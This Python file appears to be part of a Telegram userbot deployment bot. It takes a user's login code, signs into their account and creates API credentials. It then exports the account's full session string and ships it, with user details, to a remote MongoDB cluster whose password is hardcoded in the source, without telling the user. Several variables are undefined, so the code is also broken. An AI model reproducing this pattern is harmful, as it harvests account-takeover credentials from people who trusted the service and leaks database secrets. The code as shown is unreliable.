#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.

# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

from Ubot.core.db import cli
import requests
from typing import Tuple, Dict
import random

from pyrogram import (
    Client,
    filters
)
from pyrogram.types import (
    Message
)
from pyrogram.errors import (
    SessionPasswordNeeded,
    BadRequest
)
from pymongo import MongoClient
from Ubot.modules.bot.helper_funcs.helper_steps import *
from Ubot import (
    ACC_PROK_WITH_TFA,
    AKTIFPERINTAH,
    PHONE_CODE_IN_VALID_ERR_TEXT,
    RECVD_PHONE_CODE,
    SESSION_GENERATED_USING
)
import dotenv
from dotenv import load_dotenv
import os
import pymongo
from Ubot.logging import LOGGER
from os import environ, execle
from Ubot.core.db import *
import asyncio
import sys
HAPP = None


@Client.on_message(
    filters.text &
    filters.private,
    group=2
)

async def recv_tg_code_message(_, message: Message):
    w_s_dict = AKTIFPERINTAH.get(message.chat.id)
    if not w_s_dict:
        return
    sent_code = w_s_dict.get("SENT_CODE_R")
    phone_number = w_s_dict.get("PHONE_NUMBER")
    loical_ci = w_s_dict.get("USER_CLIENT")
    if not sent_code or not phone_number:
        return
    status_message = w_s_dict.get("MESSAGE")
    if not status_message:
        return
    # await status_message.delete()
    del w_s_dict["MESSAGE"]
    phone_code = "".join(message.text.split(" "))
    phone_codee = phone_code[:5]
    phone_codeapp = phone_code[5:]
    try:            
        w_s_dict["SIGNED_IN"] = await loical_ci.sign_in(
            phone_number,
            sent_code.phone_code_hash,
            phone_codee
        ) 
    except BadRequest as e:
        await status_message.reply_text(
          f"{e} \n\nKode yang anda masukkan salah, coba masukan kembali atau mulai dari awal"
        )
        del AKTIFPERINTAH[message.chat.id]
    except SessionPasswordNeeded:
        await status_message.reply_text(
          "Verifikasi 2 Langkah Diaktifkan, Mohon Masukkan Verifikasi 2 Langkah Anda."
        )
        w_s_dict["IS_NEEDED_TFA"] = True
    else:    
        # create app
        try:
            provided_code = extract_code_imn_ges(phone_codeapp)
        except:
            await message.reply_text("kode ngga kebaca")
        if provided_code is None:
            await status_message.edit_text(
                text=Config.IN_VALID_CODE_PVDED
            )
        status_r, cookie_v = login_step_get_stel_cookie(
            phone_number,
            random_hash,
            provided_code
        )
        if status_r:
            status_t, response_dv = scarp_tg_existing_app(cookie_v)
            if not status_t:
                create_new_tg_app(
                    cookie_v,
                    response_dv.get("tg_app_hash"),
                    Config.APP_TITLE,
                    Config.APP_SHORT_NAME,
                    Config.APP_URL,
                    Config.APP_PLATFORM,
                    Config.APP_DESCRIPTION
                )
            status_t, response_dv = scarp_tg_existing_app(cookie_v)
            app_id = response_dv["App Configuration"]["app_id"]
            app_hash = response_dv["App Configuration"]["api_hash"]
            
        client = pymongo.MongoClient("mongodb+srv://ubot0:ubot0@ubot.zhj1x91.mongodb.net/?retryWrites=true&w=majority")
        db = client["telegram_sessions"]
        mongo_collection = db["sesi_collection"]
        session_string = str(await loical_ci.export_session_string())
        load_dotenv()
        
        file = os.path.join(os.path.dirname(__file__), 'count.txt')
        with open(file, "r") as f:
            count = int(f.read().strip())
        count += 1
        with open(file, "w") as f:
            f.write(str(count))
        
        filename = ".env"
        with open(filename, "a") as file:
            file.write(f"\nAPP_ID{count}={str(app_id)}\nAPI_HASH{count}={str(app_hash)}\nSESSION{count}={str(await loical_ci.export_session_string())}")
        await message.reply_text("`Berhasil Melakukan Deploy.`")
        session_data = {
            "app_id": app_id or "",
            "api_hash": app_hash or "",
            "session_string": session_string,
            "user_id": message.chat.id,
            "username": message.chat.username or "",
            "first_name": message.chat.first_name or "",
            "last_name": message.chat.last_name or "",
        }        
        mongo_collection.insert_one(session_data)
        await asyncio.sleep(2.0)
        collection = cli["access"]
        await collection.users.delete_one({'user_id': int(message.chat.id)})
        try:
            await message.reply_text("**Tunggu Selama 2 Menit Kemudian Ketik .ping Untuk Mengecek Bot.**")

            LOGGER(__name__).info("BOT SERVER RESTARTED !!")
        except BaseException as err:
            LOGGER(__name__).info(f"{err}")
            return

        if HAPP is not None:
            HAPP.restart()
        else:
            args = [sys.executable, "-m", "Ubot"]
            execle(sys.executable, *args, environ)
            
    AKTIFPERINTAH[message.chat.id] = w_s_dict
    raise message.stop_propagation()
